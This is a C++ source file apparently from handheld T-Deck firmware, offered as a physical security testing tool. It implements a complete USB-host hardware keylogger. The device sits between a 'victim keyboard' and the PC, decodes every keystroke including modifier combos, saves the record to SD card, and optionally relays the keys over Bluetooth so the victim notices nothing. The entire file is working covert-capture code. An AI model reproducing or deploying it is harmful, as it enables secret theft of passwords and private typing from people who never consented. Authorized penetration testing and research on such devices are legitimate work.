// T-REX — USB host HID keylogger (physical security testing)
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Attack model:
//   [Victim keyboard] --USB--> [T-Deck (USB host)] --BLE HID--> [Victim PC]
//                                                   --SD log-->  keylog/NNN.txt
//
// T-Deck switches from USB DEVICE mode (TinyUSB) to USB HOST mode (ESP-IDF
// usb_host).  On ESP-IDF 4.4.7 the PHY is shared; calling usb_host_install()
// after tud_disconnect() reconfigures the hardware for host mode.
// tud_connect() restores device mode on exit.
//
// ux log      → log only, save to /apps/badusb/keylog/NNN.txt
// ux log ble  → same + forward via BLE HID (keyboard keeps working for victim)

#include "usb_keylog.h"
#include "display_manager.h"
#include "sdcard_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "ble_keyboard.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include <SD.h>
#include <Arduino.h>

extern "C" {
#include "usb/usb_host.h"
#include "usb/usb_types_ch9.h"
// tud_disconnect / tud_connect are TinyUSB device API — not exposed through an
// Arduino wrapper header.  Forward-declare them to avoid pulling in the entire
// TinyUSB include tree (which has its own include-path quirks in PlatformIO).
bool tud_disconnect(void);
bool tud_connect(void);
}

extern DisplayManager displayManager;
extern SDCardManager  sdCardManager;
extern InputHandling  inputHandler;

// ── HID Usage Page 0x07 → ASCII ──────────────────────────────────────────────
// Indices 0x04 (a/A) through 0x38 (/).  0x00-0x03 = error codes, not mapped.

static const uint8_t HID_NOSHIFT[0x39] = {
    0,0,0,0,                                                     // 0x00-0x03
    'a','b','c','d','e','f','g','h','i','j','k','l','m',         // 0x04-0x10
    'n','o','p','q','r','s','t','u','v','w','x','y','z',         // 0x11-0x1C
    '1','2','3','4','5','6','7','8','9','0',                     // 0x1D-0x26 (note 0x27='0')
    '\n','\x1B','\x08','\t',' ',                                // 0x28-0x2C
    '-','=','[',']','\\',0,';','\'','`',',','.','/',            // 0x2D-0x38
};
static const uint8_t HID_SHIFT[0x39] = {
    0,0,0,0,
    'A','B','C','D','E','F','G','H','I','J','K','L','M',
    'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    '!','@','#','$','%','^','&','*','(',')',
    '\n','\x1B','\x08','\t',' ',
    '_','+','{','}','|',0,':','"','~','<','>','?',
};

static char hidKeyToChar(uint8_t key, uint8_t mod) {
    if (key < 4 || key >= 0x39) return 0;
    bool shift = (mod & 0x22) != 0;
    uint8_t c = shift ? HID_SHIFT[key] : HID_NOSHIFT[key];
    return (char)c;
}

static const char* hidKeyName(uint8_t key) {
    switch (key) {
        case 0x28: return "<ENTER>"; case 0x29: return "<ESC>";
        case 0x2A: return "<BKSP>";  case 0x2B: return "<TAB>";
        case 0x3A: return "<F1>";    case 0x3B: return "<F2>";
        case 0x3C: return "<F3>";    case 0x3D: return "<F4>";
        case 0x3E: return "<F5>";    case 0x3F: return "<F6>";
        case 0x40: return "<F7>";    case 0x41: return "<F8>";
        case 0x42: return "<F9>";    case 0x43: return "<F10>";
        case 0x44: return "<F11>";   case 0x45: return "<F12>";
        case 0x4A: return "<HOME>";  case 0x4D: return "<END>";
        case 0x4B: return "<PGUP>";  case 0x4E: return "<PGDN>";
        case 0x49: return "<INS>";   case 0x4C: return "<DEL>";
        case 0x4F: return "<RIGHT>"; case 0x50: return "<LEFT>";
        case 0x51: return "<DOWN>";  case 0x52: return "<UP>";
        default:   return nullptr;
    }
}

// ── Ring buffer: USB task → main task ─────────────────────────────────────────
// Each slot stores one decoded keystroke string (ASCII char or "<NAME>" tag).
#define KLOG_RING 256
#define KLOG_SLOT 24
struct KlogEntry { char s[KLOG_SLOT]; };
static volatile KlogEntry s_ring[KLOG_RING];
static volatile uint16_t  s_rHead = 0, s_rTail = 0;

static void ringPush(const char* str) {
    uint16_t next = (uint16_t)((s_rHead + 1) % KLOG_RING);
    if (next == s_rTail) return;   // full — drop (don't block USB task)
    strncpy((char*)s_ring[s_rHead].s, str, KLOG_SLOT - 1);
    s_ring[s_rHead].s[KLOG_SLOT - 1] = '\0';
    s_rHead = next;
}

static bool ringPop(char* out, int outLen) {
    if (s_rTail == s_rHead) return false;
    strncpy(out, (const char*)s_ring[s_rTail].s, outLen - 1);
    out[outLen - 1] = '\0';
    s_rTail = (uint16_t)((s_rTail + 1) % KLOG_RING);
    return true;
}

// ── USB host state ─────────────────────────────────────────────────────────────
static usb_host_client_handle_t s_clientHdl     = nullptr;
static usb_device_handle_t      s_devHdl        = nullptr;
static usb_transfer_t*          s_transfer      = nullptr;
static uint8_t   s_prevKeys[6]    = {0};
static uint8_t   s_hidIface       = 0;
static uint8_t   s_intEpAddr      = 0;
static uint16_t  s_intEpMps       = 8;
static volatile bool    s_devReady      = false;
static volatile bool    s_devGone       = false;
// Device address set by callback, opened in task loop (not in callback) to stay
// re-entrant safe under ESP-IDF 4.4's usb_host constraint.
static volatile bool    s_newDevPending = false;
static volatile uint8_t s_newDevAddr    = 0;

// ── Client event callback (no-capture → decays to C function pointer) ─────────
static void clientEventCb(const usb_host_client_event_msg_t* msg, void* /*arg*/) {
    if (msg->event == USB_HOST_CLIENT_EVENT_NEW_DEV) {
        s_newDevAddr    = msg->new_dev.address;
        s_newDevPending = true;
    } else if (msg->event == USB_HOST_CLIENT_EVENT_DEV_GONE) {
        s_devGone  = true;
        s_devReady = false;
    }
}

// Control transfer callback: free only — SET_PROTOCOL needs no result check.
static void setProtocolCb(usb_transfer_t* t) { usb_host_transfer_free(t); }

static void setBootProtocol() {
    usb_transfer_t* ctrl = nullptr;
    if (usb_host_transfer_alloc(8, 0, &ctrl) != ESP_OK) return;
    ctrl->device_handle    = s_devHdl;
    ctrl->bEndpointAddress = 0x00;
    ctrl->callback         = setProtocolCb;
    ctrl->context          = nullptr;
    ctrl->timeout_ms       = 1000;
    ctrl->num_bytes        = 8;
    uint8_t* d = ctrl->data_buffer;
    // bmRequestType=0x21 (class|interface|host-to-dev), bRequest=0x0B (SET_PROTOCOL),
    // wValue=0x0000 (boot), wIndex=interface, wLength=0
    d[0]=0x21; d[1]=0x0B; d[2]=0x00; d[3]=0x00;
    d[4]=s_hidIface; d[5]=0x00; d[6]=0x00; d[7]=0x00;
    usb_host_transfer_submit_control(s_clientHdl, ctrl);
}

// ── Parse one 8-byte HID boot keyboard report → push decoded keys to ring ─────
// Called from interrupt-transfer callback (USB task context).
// Must NOT call BLE/display/SD APIs — ring is the only shared data structure.
static void parseReport(const uint8_t* data) {
    uint8_t mod        = data[0];
    const uint8_t* keys = data + 2;  // bytes 2-7: up to 6 simultaneous keycodes

    for (int ki = 0; ki < 6; ki++) {
        uint8_t key = keys[ki];
        if (key == 0 || key == 1) continue;   // 0=none, 1=rollover error

        bool wasDown = false;
        for (int pi = 0; pi < 6; pi++)
            if (s_prevKeys[pi] == key) { wasDown = true; break; }
        if (wasDown) continue;   // key was already pressed in previous report

        bool ctrl = (mod & 0x11) != 0;
        bool alt  = (mod & 0x44) != 0;
        bool gui  = (mod & 0x88) != 0;

        char buf[KLOG_SLOT];
        if (ctrl || alt || gui) {
            // Modifier combo: format as <CTRL+X>
            buf[0] = '<'; buf[1] = '\0';
            if (ctrl) strncat(buf, "CTRL+", sizeof(buf) - strlen(buf) - 1);
            if (alt)  strncat(buf, "ALT+",  sizeof(buf) - strlen(buf) - 1);
            if (gui)  strncat(buf, "GUI+",  sizeof(buf) - strlen(buf) - 1);
            char c = hidKeyToChar(key, 0);
            if (c >= 0x20) {
                char tmp[3] = {(char)toupper((unsigned char)c), '>', '\0'};
                strncat(buf, tmp, sizeof(buf) - strlen(buf) - 1);
            } else {
                char tmp[10]; snprintf(tmp, sizeof(tmp), "0x%02X>", key);
                strncat(buf, tmp, sizeof(buf) - strlen(buf) - 1);
            }
            ringPush(buf);
        } else {
            char c = hidKeyToChar(key, mod);
            if (c) {
                buf[0] = c; buf[1] = '\0';
                ringPush(buf);
            } else {
                const char* nm = hidKeyName(key);
                if (nm) ringPush(nm);
            }
        }
    }
    memcpy(s_prevKeys, keys, 6);
}

// ── Interrupt transfer callback (USB task context) ────────────────────────────
static void intrCb(usb_transfer_t* t) {
    if (t->status == USB_TRANSFER_STATUS_COMPLETED && t->actual_num_bytes >= 8)
        parseReport(t->data_buffer);
    if (!s_devGone)
        usb_host_transfer_submit(t);   // immediate resubmit → continuous polling
}

// ── USB host daemon task (core 0) ─────────────────────────────────────────────
// The TinyUSB device task ("usbd") runs at configMAX_PRIORITIES-1 and holds
// the USB OTG interrupt.  We MUST suspend it before calling usb_host_install()
// so the host library can re-register the interrupt for host mode.
// Resume it on exit so the rest of the firmware's USB device stack works again.
static void usbHostTask(void* /*arg*/) {
    TaskHandle_t tusbTask = xTaskGetHandle("usbd");
    if (tusbTask) vTaskSuspend(tusbTask);

    usb_host_config_t cfg = {
        .skip_phy_setup = false,
        .intr_flags     = ESP_INTR_FLAG_LEVEL1
    };
    if (usb_host_install(&cfg) != ESP_OK) {
        // PHY reconfiguration still failed — signal main task and bail out.
        if (tusbTask) vTaskResume(tusbTask);
        s_devGone = true;
        vTaskDelete(nullptr);
        return;
    }

    usb_host_client_config_t ccfg = {
        .is_synchronous    = false,
        .max_num_event_msg = 5,
        .async = {
            .client_event_callback = clientEventCb,
            .callback_arg          = nullptr
        }
    };
    usb_host_client_register(&ccfg, &s_clientHdl);

    bool ifaceClaimed = false;

    while (!s_devGone) {
        usb_host_lib_handle_events(pdMS_TO_TICKS(10), nullptr);
        usb_host_client_handle_events(s_clientHdl, pdMS_TO_TICKS(0));

        // Open device in task loop, not in callback (ESP-IDF 4.4 constraint)
        if (s_newDevPending && !s_devHdl) {
            s_newDevPending = false;
            usb_host_device_open(s_clientHdl, s_newDevAddr, &s_devHdl);
        }

        if (s_devHdl && !ifaceClaimed) {
            const usb_config_desc_t* cfgDesc;
            if (usb_host_get_active_config_descriptor(s_devHdl, &cfgDesc) != ESP_OK)
                continue;

            const uint8_t* p   = (const uint8_t*)cfgDesc;
            const uint8_t* end = p + cfgDesc->wTotalLength;
            bool inHid = false;

            while (p < end) {
                uint8_t bLen  = p[0], bType = p[1];
                if (bLen < 2) break;

                if (bType == USB_B_DESCRIPTOR_TYPE_INTERFACE) {
                    // HID Boot Keyboard: bInterfaceClass=3, bInterfaceSubClass=1, bInterfaceProtocol=1
                    inHid = (p[5] == USB_CLASS_HID && p[6] == 1 && p[7] == 1);
                    if (inHid) s_hidIface = p[2];
                }
                if (inHid && bType == USB_B_DESCRIPTOR_TYPE_ENDPOINT) {
                    uint8_t  eAddr = p[2], eAttr = p[3];
                    uint16_t mps   = (uint16_t)p[4] | ((uint16_t)p[5] << 8);
                    if ((eAddr & 0x80) && (eAttr & 0x03) == 0x03) {  // IN + interrupt
                        s_intEpAddr = eAddr;
                        s_intEpMps  = (mps < 8) ? 8 : mps;

                        if (usb_host_interface_claim(s_clientHdl, s_devHdl, s_hidIface, 0) == ESP_OK) {
                            ifaceClaimed = true;
                            setBootProtocol();
                            vTaskDelay(pdMS_TO_TICKS(60));

                            if (usb_host_transfer_alloc(s_intEpMps, 0, &s_transfer) == ESP_OK) {
                                s_transfer->device_handle    = s_devHdl;
                                s_transfer->bEndpointAddress = s_intEpAddr;
                                s_transfer->callback         = intrCb;
                                s_transfer->context          = nullptr;
                                s_transfer->num_bytes        = s_intEpMps;
                                s_transfer->timeout_ms       = 0;
                                usb_host_transfer_submit(s_transfer);
                                s_devReady = true;
                            }
                        }
                        break;   // found our endpoint
                    }
                }
                p += bLen;
            }
        }
    }

    // Ordered teardown
    if (s_transfer)  { usb_host_transfer_free(s_transfer); s_transfer = nullptr; }
    if (s_devHdl && ifaceClaimed)
        usb_host_interface_release(s_clientHdl, s_devHdl, s_hidIface);
    if (s_devHdl)    { usb_host_device_close(s_clientHdl, s_devHdl); s_devHdl = nullptr; }
    if (s_clientHdl) { usb_host_client_deregister(s_clientHdl); s_clientHdl = nullptr; }
    usb_host_uninstall();

    // Restore TinyUSB device task — firmware's USB keyboard/MSC work again
    if (tusbTask) vTaskResume(tusbTask);
    vTaskDelete(nullptr);
}

// ── runUsbKeylog() ────────────────────────────────────────────────────────────
void runUsbKeylog(bool bleForward) {
    DisplayManager& dm = displayManager;

    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    dm.setTextColor(0x7BEF);     dm.printText("[USB::");
    dm.setTextColor(TFT_YELLOW); dm.println(bleForward ? "KEYLOG+BLE]" : "KEYLOG]");
    dm.printSeparator();
    dm.setCursor(10, dm.getCursorY());

    // ── Stop USB device mode ──────────────────────────────────────────────────
    // tud_disconnect() asserts the D+ pulldown (DP_PULLDOWN) so the host PC sees
    // a USB disconnect.  This lets the USB HAL go idle before usb_host_install()
    // reconfigures the OTG controller for host mode.
    tud_disconnect();
    vTaskDelay(pdMS_TO_TICKS(250));

    // ── Optional BLE HID forward setup ───────────────────────────────────────
    if (bleForward) {
        dm.setTextColor(0x7BEF); dm.println("Starting BLE HID...");
        bleKeyboard.badusbBegin(nullptr, 1, "T-REX-KBD");
        uint32_t t0 = millis();
        int infoY = dm.getCursorY();
        while (!bleKeyboard.badusbConnected() && millis() - t0 < 30000) {
            if (!displayManager.isBlocked()) {
                dm.fillRect(0, infoY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
                dm.setCursor(10, infoY);
                dm.setTextColor(0x7BEF); dm.printText("Waiting BLE... ");
                char ts[8]; snprintf(ts, sizeof(ts), "%lus", (millis()-t0)/1000);
                dm.println(ts);
            }
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') {
                bleKeyboard.badusbEnd();
                tud_connect();
                vTaskDelay(pdMS_TO_TICKS(100));
                dm.printCommandScreen(); return;
            }
            vTaskDelay(pdMS_TO_TICKS(500));
        }
        if (!bleKeyboard.badusbConnected()) {
            dm.fillRect(0, infoY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setCursor(10, infoY);
            dm.setTextColor(TFT_YELLOW); dm.println("BLE timeout — log-only.");
            bleForward = false;
        } else {
            dm.fillRect(0, infoY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setCursor(10, infoY);
            dm.setTextColor(TFT_GREEN);  dm.println("BLE host connected.");
        }
    }

    dm.setCursor(10, dm.getCursorY());
    dm.setTextColor(TFT_WHITE); dm.println("Plug victim keyboard into");
    dm.setCursor(10, dm.getCursorY());
    dm.setTextColor(0x7BEF);   dm.println("USB port.  [q]=stop");
    dm.printSeparator();

    int statusY  = dm.getCursorY();
    int countY   = statusY + LINE_HEIGHT;
    int lastKeyY = countY  + LINE_HEIGHT;

    // ── Reset state ───────────────────────────────────────────────────────────
    s_rHead = s_rTail = 0;
    s_devReady = s_devGone = false;
    s_newDevPending = false;
    s_devHdl = nullptr; s_clientHdl = nullptr; s_transfer = nullptr;
    memset(s_prevKeys, 0, sizeof(s_prevKeys));

    // ── Launch USB host daemon on core 0 ──────────────────────────────────────
    TaskHandle_t hostTask = nullptr;
    xTaskCreatePinnedToCore(usbHostTask, "usb_host_kl", 8192, nullptr, 5, &hostTask, 0);

    // ── Log buffer (RAM, flushed to SD on exit) ───────────────────────────────
    static char logBuf[8192];
    int  logLen   = 0; logBuf[0] = '\0';
    uint32_t charCount = 0;
    char     lastKeyDisplay[KLOG_SLOT] = "---";
    uint32_t lastDrawMs = 0;
    bool hostInstallFailed = false;

    // ── Main loop ─────────────────────────────────────────────────────────────
    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
            dm.setTextColor(0x7BEF);     dm.printText("[USB::");
            dm.setTextColor(TFT_YELLOW); dm.println(bleForward ? "KEYLOG+BLE]" : "KEYLOG]");
            dm.printSeparator();
            statusY  = dm.getCursorY();
            countY   = statusY + LINE_HEIGHT;
            lastKeyY = countY  + LINE_HEIGHT;
            lastDrawMs = 0;
        }

        // Check if host install failed (task set s_devGone immediately)
        if (s_devGone && charCount == 0 && hostTask &&
            eTaskGetState(hostTask) == eDeleted && !hostInstallFailed) {
            hostInstallFailed = true;
            dm.fillRect(0, statusY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setCursor(10, statusY);
            dm.setTextColor(TFT_RED);
            dm.println("USB host init failed.");
            dm.setCursor(10, countY);
            dm.setTextColor(TFT_YELLOW);
            dm.println("Reboot T-Deck and retry.");
            break;
        }

        // Drain the ring → log buf + BLE forward (main task context)
        char slot[KLOG_SLOT];
        while (ringPop(slot, sizeof(slot))) {
            if (slot[0] == '<')
                strncpy(lastKeyDisplay, slot, sizeof(lastKeyDisplay) - 1);
            else if ((unsigned char)slot[0] >= 0x20)
                snprintf(lastKeyDisplay, sizeof(lastKeyDisplay), "'%c'", slot[0]);

            int slen = (int)strlen(slot);
            if (logLen + slen < (int)sizeof(logBuf) - 2) {
                memcpy(logBuf + logLen, slot, slen);
                logLen += slen;
                logBuf[logLen] = '\0';
            }
            charCount++;

            if (bleForward && slot[0] != '<' && bleKeyboard.badusbConnected()) {
                bleKeyboard.kbdHoldChar(slot[0]);
                bleKeyboard.kbdReleaseAll();
            }
        }

        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        uint32_t now = millis();
        if (now - lastDrawMs >= 200 && !displayManager.isBlocked()) {
            lastDrawMs = now;

            dm.fillRect(0, statusY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setCursor(10, statusY);
            if (s_devGone && !hostInstallFailed) {
                dm.setTextColor(TFT_RED);    dm.println("Keyboard disconnected.");
            } else if (!s_devReady && !s_devGone) {
                dm.setTextColor(TFT_YELLOW); dm.println("Waiting for keyboard...");
            } else if (s_devReady) {
                dm.setTextColor(TFT_GREEN);  dm.println("Keyboard active.");
            }

            dm.fillRect(0, countY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setCursor(10, countY);
            dm.setTextColor(0x7BEF); dm.printText("Logged: ");
            char nb[28]; snprintf(nb, sizeof(nb), "%lu keystrokes", charCount);
            dm.println(nb);

            dm.fillRect(0, lastKeyY, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setCursor(10, lastKeyY);
            dm.setTextColor(TFT_CYAN);  dm.printText("Last: ");
            dm.setTextColor(TFT_WHITE); dm.println(lastKeyDisplay);
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // ── Teardown ───────────────────────────────────────────────────────────────
    s_devGone = true;   // stop re-submit in intrCb
    if (hostTask) {
        uint32_t tw = millis();
        while (eTaskGetState(hostTask) != eDeleted && millis() - tw < 2000)
            vTaskDelay(pdMS_TO_TICKS(50));
    }

    if (bleForward) bleKeyboard.badusbEnd();

    // Reconnect T-Deck as USB device (re-assert D+ pullup → host sees device again)
    tud_connect();
    vTaskDelay(pdMS_TO_TICKS(200));

    // ── Save log to SD ─────────────────────────────────────────────────────────
    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    if (logLen > 0 && sdCardManager.isReady()) {
        char path[48]; int i;
        for (i = 1; i <= 999; i++) {
            snprintf(path, sizeof(path), "%s/%03d.txt", SD_DIR_BADUSB_KEYLOG, i);
            if (!SD.exists(path)) break;
        }
        bool saved = false;
        if (i <= 999) {
            File f = SD.open(path, FILE_WRITE);
            if (f) { f.print(logBuf); f.close(); saved = true; }
        }
        if (saved) {
            dm.setTextColor(TFT_GREEN);  dm.printText("Saved: ");
            const char* base = strrchr(path, '/'); dm.println(base ? base + 1 : path);
            dm.setCursor(10, dm.getCursorY());
            char nb[32]; snprintf(nb, sizeof(nb), "%lu keystrokes captured.", charCount);
            dm.println(nb);
        } else {
            dm.setTextColor(TFT_RED); dm.println("SD save failed.");
        }
    } else {
        dm.setTextColor(charCount == 0 ? TFT_YELLOW : TFT_RED);
        dm.println(charCount == 0 ? "Nothing captured." : "No SD — log lost.");
    }
    vTaskDelay(pdMS_TO_TICKS(2500));
    dm.printCommandScreen();
}
